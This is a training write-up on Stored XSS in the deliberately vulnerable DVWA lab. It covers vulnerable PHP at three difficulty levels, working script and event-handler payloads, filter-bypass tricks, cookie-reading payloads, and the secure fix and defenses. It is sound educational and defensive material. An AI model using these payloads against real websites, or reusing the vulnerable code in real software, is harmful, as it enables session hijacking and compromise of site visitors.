# DVWA Stored XSS - Penetration Testing Training

> Based on [DVWA (Damn Vulnerable Web Application)](https://github.com/digininja/DVWA) Stored XSS module, covering Low / Medium / High security levels.

## Table of Contents

- [Overview](#overview)
- [Stored vs Reflected XSS](#stored-vs-reflected-xss)
- [Environment Setup](#environment-setup)
- [Low Level](#low-level)
- [Medium Level](#medium-level)
- [High Level](#high-level)
- [Comparison](#comparison)
- [Fix & Defense](#fix--defense)
- [Disclaimer](#disclaimer)

## Overview

Stored XSS (also known as Persistent XSS) occurs when malicious script is **permanently stored** on the target server (e.g., in a database, message forum, comment field). Every user who visits the affected page will have the script executed in their browser — **no malicious link required**.

**Attack Flow:**

```
Attacker submits malicious script via form (e.g., guestbook)
        |
        v
Server stores the payload in database (no sanitization)
        |
        v
Any user visits the page
        |
        v
Server reads payload from DB, renders it in HTML
        |
        v
Browser executes malicious script automatically
        |
        v
Cookie / Session stolen for EVERY visitor
```

## Stored vs Reflected XSS

| | Reflected XSS | Stored XSS |
|---|---|---|
| **Trigger** | Victim must click a crafted link | Victim just visits the page normally |
| **Persistence** | One-time, embedded in URL | Permanent, stored in database |
| **Scope** | Single user per click | **All users** who visit the page |
| **Stealth** | Suspicious URL visible | **No suspicious URL**, hard to detect |
| **Severity** | High | **Critical** |

## Environment Setup

| Item | Detail |
|------|--------|
| Platform | DVWA |
| Module | XSS (Stored) - `/vulnerabilities/xss_s/` |
| Method | POST |
| Parameters | `txtName` (Name), `mtxMessage` (Message) |
| Frontend Limit | Name field `maxlength=10` (must bypass via DevTools / Burp) |
| Browser | Chrome / Firefox (XSS Auditor disabled) |
| Tools | Burp Suite / Browser DevTools (F12) |

### Bypassing `maxlength`

The Name input field has a `maxlength=10` restriction in HTML. To inject payloads longer than 10 characters:

**Method 1 — Browser DevTools (F12):**
1. Right-click the Name input → Inspect Element
2. Find `<input name="txtName" ... maxlength="10">`
3. Delete the `maxlength="10"` attribute or change it to `maxlength="200"`

**Method 2 — Burp Suite:**
1. Enter any short value in the Name field
2. Intercept the POST request in Burp
3. Modify the `txtName` parameter value directly

## Low Level

### Source Code

```php
<?php
if( isset( $_POST[ 'btnSign' ] ) ) {
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = mysqli_real_escape_string($conn, $message);

    // Sanitize name input
    $name = mysqli_real_escape_string($conn, $name);

    // Update database
    $query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($conn, $query);
}
?>
```

### Vulnerability

Both `message` and `name` fields have **zero XSS protection**. Only SQL injection is mitigated via `mysqli_real_escape_string()`. No output encoding whatsoever.

### Payloads

**Message field** — direct injection:

```
Name:    test
Message: <script>alert('XSS')</script>
```

**Name field** — bypass maxlength first, then:

```
Name:    <script>alert('XSS')</script>
Message: test
```

**Cookie stealing:**

```
Name:    test
Message: <script>alert(document.cookie)</script>
```

## Medium Level

### Source Code

```php
<?php
if( isset( $_POST[ 'btnSign' ] ) ) {
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = mysqli_real_escape_string($conn, $message);
    $message = htmlspecialchars( $message );              // <-- secured

    // Sanitize name input
    $name = str_replace( '<script>', '', $name );         // <-- weak filter
    $name = mysqli_real_escape_string($conn, $name);

    // Update database
    $query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($conn, $query);
}
?>
```

### Vulnerability

| Field | Protection | Secure? |
|-------|-----------|---------|
| `message` | `strip_tags()` + `addslashes()` + `htmlspecialchars()` | **Yes** |
| `name` | `str_replace('<script>', '')` only | **No** — blacklist bypass |

The `message` field is now properly protected. The attack surface shifts to the **`name` field**, which only filters the exact lowercase string `<script>`.

### Bypass Methods & Payloads (Name field)

> Remember: bypass `maxlength=10` first via F12 or Burp Suite.

**1. Case Manipulation:**

```
Name:    <Script>alert('XSS')</Script>
Message: test
```

**2. Nested / Double-Write:**

```
Name:    <scr<script>ipt>alert('XSS')</scr<script>ipt>
Message: test
```

**3. Alternative HTML Tags:**

```
Name:    <img src=1 onerror=alert('XSS')>
Message: test
```

**Cookie Stealing (Name field):**

```
Name:    <Script>alert(document.cookie)</Script>
Name:    <scr<script>ipt>alert(document.cookie)</scr<script>ipt>
Name:    <img src=1 onerror=alert(document.cookie)>
```

## High Level

### Source Code

```php
<?php
if( isset( $_POST[ 'btnSign' ] ) ) {
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = mysqli_real_escape_string($conn, $message);
    $message = htmlspecialchars( $message );              // <-- secured

    // Sanitize name input
    $name = preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name); // <-- regex
    $name = mysqli_real_escape_string($conn, $name);

    // Update database
    $query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($conn, $query);
}
?>
```

### Vulnerability

| Field | Protection | Secure? |
|-------|-----------|---------|
| `message` | `strip_tags()` + `addslashes()` + `htmlspecialchars()` | **Yes** |
| `name` | Regex blocks all `<script>` variants (`/i` + `.*`) | **No** — only blocks `<script>` tag |

Compared to Medium, the regex now handles case variations and nested attempts. But it **only targets the `<script>` pattern** — any HTML tag without the word "script" bypasses it entirely.

### Bypass Methods & Payloads (Name field)

> Remember: bypass `maxlength=10` first via F12 or Burp Suite.

**Verified blocked** — these no longer work:

```
<script>alert('XSS')</script>          ← blocked
<Script>alert('XSS')</Script>          ← blocked (/i flag)
<scr<script>ipt>alert('XSS')          ← blocked (.* wildcard)
```

**Bypass via non-script tags + event handlers:**

```
Name:    <img src=1 onerror=alert('XSS')>
Name:    <svg onload=alert('XSS')>
Name:    <body onload=alert('XSS')>
Name:    <input onfocus=alert('XSS') autofocus>
Name:    <iframe src="javascript:alert('XSS')">
```

**Cookie Stealing (Name field):**

```
Name:    <img src=1 onerror=alert(document.cookie)>
Name:    <svg onload=alert(document.cookie)>
Name:    <input onfocus=alert(document.cookie) autofocus>
```

## Comparison

### Defense by Field

| Field | Low | Medium | High |
|---|---|---|---|
| `message` | `stripslashes` + SQL escape | `strip_tags` + `htmlspecialchars` | Same as Medium |
| `name` | SQL escape only | `str_replace('<script>','')` | Regex `/i` + `.*` wildcard |

### Attack Surface

| | Low | Medium | High |
|---|---|---|---|
| **Injectable field** | Both | `name` only | `name` only |
| **Frontend bypass** | Optional | **Required** (maxlength) | **Required** (maxlength) |
| **Bypass strategy** | Direct injection | Case / Nested / Alt tags | Alt tags + Event handlers |
| **Difficulty** | None | Low | Low-Medium |
| **Root cause** | No XSS defense at all | `name` field blacklist incomplete | `name` field only blocks `<script>` |

**Key Takeaway:** Medium and High levels properly secured the `message` field with `htmlspecialchars()`, but **forgot to apply the same protection to the `name` field** — a classic "barrel effect" where the weakest point determines overall security.

## Fix & Defense

### Correct Approach (DVWA Impossible Level)

```php
<?php
if( isset( $_POST[ 'btnSign' ] ) ) {
    checkToken( $_REQUEST['user_token'], $_SESSION['session_token'], 'index.php' );

    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = mysqli_real_escape_string($conn, $message);
    $message = htmlspecialchars( $message, ENT_QUOTES, 'UTF-8' );

    // Sanitize name input — apply the SAME protection
    $name = stripslashes( $name );
    $name = mysqli_real_escape_string($conn, $name);
    $name = htmlspecialchars( $name, ENT_QUOTES, 'UTF-8' );

    // Use prepared statements
    $stmt = $conn->prepare("INSERT INTO guestbook (comment, name) VALUES (?, ?)");
    $stmt->bind_param('ss', $message, $name);
    $stmt->execute();
    $stmt->close();
}
generateSessionToken();
?>
```

### Why This Works

`htmlspecialchars()` converts special characters to HTML entities:

| Char | Entity | Effect |
|------|--------|--------|
| `<` | `&lt;` | Prevents tag creation |
| `>` | `&gt;` | Prevents tag closure |
| `"` | `&quot;` | Prevents attribute escape |
| `'` | `&#039;` | Prevents single-quote escape |
| `&` | `&amp;` | Prevents entity bypass |

### Defense in Depth

| Layer | Measure | Purpose |
|-------|---------|---------|
| Code | `htmlspecialchars()` on **ALL** output fields | Fundamental XSS fix |
| Database | Prepared Statements (parameterized queries) | Prevent SQL injection |
| Session | Anti-CSRF Token | Prevent cross-site form submission |
| HTTP | `Content-Security-Policy: script-src 'self'` | Block inline script execution |
| Architecture | Template engines with auto-escaping (Twig, Blade) | Framework-level protection |
| CI/CD | Automated XSS scanning | Continuous regression testing |

## Disclaimer

This repository is for **authorized security training and educational purposes only**. All tests were conducted on a local DVWA instance. Do not use these techniques against any system without explicit written authorization. Unauthorized access to computer systems is illegal.

## References

- [DVWA Official Repository](https://github.com/digininja/DVWA)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)

